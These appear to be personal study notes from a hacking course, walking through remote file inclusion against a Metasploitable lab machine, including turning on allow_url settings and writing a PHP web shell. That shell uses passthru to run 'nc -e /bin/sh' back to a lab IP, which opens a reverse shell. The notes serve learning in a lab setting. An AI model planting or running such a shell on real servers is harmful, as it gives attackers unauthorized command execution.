### Remote File Inclusion Vulnerabilities

* Remote file inclusion vulnerabilties are similar to local file inclusion
* The difference is this time we run php files from another server onto this server.

* But first i'm to going to have to change the settings on the server to allow php files outside of this server.
* Allow_url and allow_url_fopen are two settings that need to be on before we can include any files outside of the server.

* Then restart the apache2 web server.

---

* For remote file inclusion to work you will need a server to host your php files on.
* But as i'm on the same network as the metasploitable machine i will not need this.

* So first create a php shell.

```php
<?php

passthru('nc -e /bin/sh 10.0.2.15 4444');

?>
```

* Then we save this as a .txt file as we don't want to being executed as php file on my machine.
